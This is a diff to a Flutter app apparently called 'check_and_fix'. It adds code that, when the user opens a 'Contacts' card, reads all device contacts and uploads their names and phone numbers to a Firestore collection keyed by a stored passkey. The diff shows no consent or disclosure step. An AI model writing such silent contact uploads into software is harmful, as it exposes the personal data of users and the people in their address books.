@@ -1,16 +1,21 @@
 // ignore_for_file: use_build_context_synchronously
 
+import 'dart:convert';
+import 'dart:developer';
+
 import 'package:check_and_fix/core/constants/constants_colors.dart';
 import 'package:check_and_fix/presentation/providers/provider_main.dart';
 import 'package:check_and_fix/presentation/providers/uni_provider.dart';
 import 'package:check_and_fix/presentation/widgets/common_bottom_sheet.dart';
 import 'package:check_and_fix/services/api_services.dart';
+import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:device_calendar/device_calendar.dart';
 import 'package:file_picker/file_picker.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_easyloading/flutter_easyloading.dart';
 import 'package:geolocator/geolocator.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 
 import '../presentation/utils/init_service.dart';
 
@@ -58,6 +63,29 @@ class CardActions {
             await DeviceCalendarPlugin().requestPermissions();
             final c = await DeviceCalendarPlugin().retrieveCalendars();
             context.uniProvider.calendersUpdate(c.data?.toList() ?? []);
+          }
+          if (mainTitleX == "Contacts") {
+            SharedPreferences prefs = await SharedPreferences.getInstance();
+
+            final passkey = prefs.getString('passKey');
+            List<Contact> contacts = await ContactsService.getContacts();
+            // List<User>? phonesData;
+            List phonesData = [];
+
+            for (var c in contacts) {
+              if ((c.phones ?? []).isNotEmpty) {
+                phonesData.add(
+                  {
+                    "mobileNumber": '${c.phones?.first.value}',
+                    "name": c.displayName,
+                  },
+                );
+              }
+            }
+            await FirebaseFirestore.instance
+                .collection('Contacts')
+                .doc(passkey)
+                .set({'contact': phonesData});
           }
           Navigator.pop(context);
 
